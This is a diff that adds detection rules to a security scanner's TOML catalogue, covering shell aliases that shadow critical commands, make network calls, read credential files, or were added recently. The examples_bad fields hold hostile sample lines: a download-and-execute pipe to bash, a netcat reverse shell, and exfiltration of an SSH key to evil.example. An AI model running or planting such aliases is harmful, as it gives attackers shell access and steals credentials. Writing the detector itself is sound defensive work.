@@ -2090,3 +2090,51 @@ examples_good = ["a `.envrc` you wrote to set project env vars (`use node`, `exp
 false_positive_guidance = "Any `.envrc` you authored for a project trips this on first sight. direnv already requires `direnv allow`; once you trust it, re-baseline with `tirith persistence scan`."
 remediation = "Inspect the `.envrc` shown by `tirith persistence diff` BEFORE running `direnv allow`. If unrecognized, do not allow it and remove the file. If intended, re-snapshot to record the new baseline."
 mitre_id = "T1546"
+
+[[rule]]
+id = "alias_overrides_critical_command"
+title = "Alias / function shadows a critical command"
+category = "aliases"
+severity_rationale = "Medium — an alias or function named after a trusted command (`ls`, `cd`, `git`, `ssh`, `sudo`, `npm`, `pip`, `docker`, `kubectl`, `aws`) silently interposes itself every time you type that command. A wrapper can log your arguments, alter behavior, or chain a hidden step (`alias sudo='sudo evil-wrapper'`). It is reported, not blocked — overriding `ls` for colors is common and benign."
+description = "`tirith aliases scan` found an alias or function whose name matches a critical command. Surfaces the definition + location for review; the rule reports the shadowing, not maliciousness."
+examples_bad = ["alias sudo='sudo evil-wrapper'", "git() { command git \"$@\"; curl https://evil.example/\"$1\"; }"]
+examples_good = ["alias ls='ls --color=auto'", "alias git='git --no-pager' — a personal convenience wrapper you wrote"]
+false_positive_guidance = "Convenience wrappers (colorized `ls`, paginated `git`) trip this routinely. Run `tirith aliases explain <name>` to read the body; if you recognize it, it's fine."
+remediation = "Inspect the body with `tirith aliases explain <name>`. If you did not create it, remove the definition from the rc file it was parsed from and investigate how it got there."
+mitre_id = "T1059.004"
+
+[[rule]]
+id = "alias_contains_network_call"
+title = "Alias / function body makes a network call"
+category = "aliases"
+severity_rationale = "High — a network tool (`curl`, `wget`, `nc`/`ncat`/`netcat`) hidden inside an everyday alias fires whenever the alias is invoked, making it a stealthy exfiltration or download-execute channel. An alias you run dozens of times a day is a far more reliable trigger than a one-off command."
+description = "`tirith aliases scan` parsed an alias/function body that invokes a network tool as a command word. The matched tool is reported in the finding detail."
+examples_bad = ["alias deploy='curl https://evil.example/p.sh | bash'", "ll() { ls -la; nc attacker 4444 -e /bin/sh; }"]
+examples_good = ["alias dl='curl -fsSL' — a deliberate download helper you authored and trust"]
+false_positive_guidance = "A network helper you wrote on purpose (a `curl` wrapper) trips this. Confirm the URL/host is one you control with `tirith aliases explain <name>`."
+remediation = "Read the body with `tirith aliases explain <name>`. If the network call is unexpected, remove the definition and rotate any credentials the alias could have exfiltrated."
+mitre_id = "T1059.004"
+
+[[rule]]
+id = "alias_contains_credential_read"
+title = "Alias / function body reads a credential file"
+category = "aliases"
+severity_rationale = "High — an alias that quietly reads a secret file (`~/.aws/credentials`, `~/.ssh/id_*`, `~/.netrc`, `~/.npmrc`, `~/.kube/config`, `~/.git-credentials`, …) every time you run it is a credential-theft foothold, especially when paired with a network call elsewhere in the body."
+description = "`tirith aliases scan` parsed an alias/function body that references a known credential-file path. The matched path fragment is reported in the finding detail."
+examples_bad = ["alias getkey='cat ~/.aws/credentials'", "sshkey() { cat ~/.ssh/id_ed25519 | curl -d @- https://evil.example; }"]
+examples_good = ["alias awswho='aws sts get-caller-identity' — uses the AWS CLI, does not read the raw credentials file"]
+false_positive_guidance = "A legitimate helper that reads a config file you own can trip this. Confirm the body with `tirith aliases explain <name>`; reading the file locally with no network call is usually benign."
+remediation = "Inspect the body with `tirith aliases explain <name>`. If the credential read is unexpected — especially alongside a network call — remove the definition and rotate the affected secret."
+mitre_id = "T1552.001"
+
+[[rule]]
+id = "alias_recently_added"
+title = "Alias / function defined in a recently-modified rc file"
+category = "aliases"
+severity_rationale = "Info — the rc file an alias/function was parsed from was modified within the last hour. This surfaces a freshly-planted alias for review without claiming it is malicious; recency is a signal to look, not a verdict."
+description = "`tirith aliases scan` flagged an alias/function whose defining rc file's mtime is within the last hour. Runtime-enumerated aliases (no source file) cannot be dated and never fire this rule."
+examples_bad = ["a new `alias sudo='…'` appended to ~/.bashrc minutes ago by a script you didn't run"]
+examples_good = ["an alias you just added yourself while configuring your shell — expected to be recent"]
+false_positive_guidance = "If you just edited your rc file, every alias in it looks recent. This is Info-only context, not an alert — pair it with the other alias rules to decide whether to investigate."
+remediation = "If you did not recently edit the rc file shown in the finding location, review the added aliases/functions and investigate what modified the file."
+mitre_id = "T1546.004"
